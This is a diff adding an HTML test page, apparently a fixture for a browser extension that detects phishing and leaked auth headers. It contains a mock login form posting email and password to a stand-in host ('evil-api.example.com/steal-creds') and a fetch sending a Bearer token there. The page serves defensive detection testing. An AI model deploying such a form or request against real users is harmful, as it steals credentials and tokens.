@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Test: Auth Header Leak Detection</title>
+  <style>
+    body { font-family: sans-serif; max-width: 600px; margin: 40px auto; }
+    .info { background: #fce4ec; padding: 16px; border-radius: 8px; margin-bottom: 20px; }
+    form { background: #f5f5f5; padding: 20px; border-radius: 8px; margin-top: 20px; }
+    input { display: block; margin: 10px 0; padding: 8px; width: 100%; box-sizing: border-box; }
+    button { padding: 10px 20px; margin: 5px; cursor: pointer; border: none; border-radius: 4px; }
+    .trigger { background: #ef5350; color: white; }
+    .safe { background: #66bb6a; color: white; }
+    #log { background: #263238; color: #aed581; padding: 16px; border-radius: 8px; font-family: monospace; font-size: 13px; min-height: 100px; margin-top: 16px; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>Auth Header Leak Detection Test</h1>
+  <div class="info">
+    <strong>Expected:</strong> This page triggers PASSWORD_FIELD (+20) and DOMAIN_MISMATCH (+30) = 50 immediately (ALERT).
+    Clicking the red button also triggers AUTH_HEADER_THIRD_PARTY (+30) via the network hook = total 80.
+  </div>
+
+  <!-- Phishing form submitting to external domain -->
+  <form action="https://evil-api.example.com/steal-creds" method="POST">
+    <label>Email</label>
+    <input type="email" name="email" placeholder="you@example.com">
+    <label>Password</label>
+    <input type="password" name="password" placeholder="Enter password">
+    <button type="submit">Log In</button>
+  </form>
+
+  <h3>Test Auth Header Leak:</h3>
+  <button class="trigger" onclick="leakAuth()">Send Auth to Third-Party (should trigger)</button>
+  <button class="safe" onclick="safeAuth()">Send Auth to Same Domain (safe)</button>
+
+  <div id="log">Console log:</div>
+
+  <script>
+    function log(msg) {
+      document.getElementById('log').textContent += '\n' + msg;
+      console.log(msg);
+    }
+
+    async function leakAuth() {
+      log('[TEST] Sending Authorization header to third-party domain...');
+      try {
+        await fetch('https://evil-api.example.com/data', {
+          headers: { 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJ0ZXN0IjoiMSJ9.abc123def456' }
+        });
+      } catch (e) {
+        log('[EXPECTED] Network error (domain doesn\'t exist) — extension should still detect the header');
+      }
+    }
+
+    async function safeAuth() {
+      log('[TEST] Sending Authorization header to same domain (safe)...');
+      try {
+        await fetch('/api/me', {
+          headers: { 'Authorization': 'Bearer test-token' }
+        });
+      } catch (e) {
+        log('[INFO] Request to same domain — extension should NOT flag this');
+      }
+    }
+  </script>
+</body>
+</html>
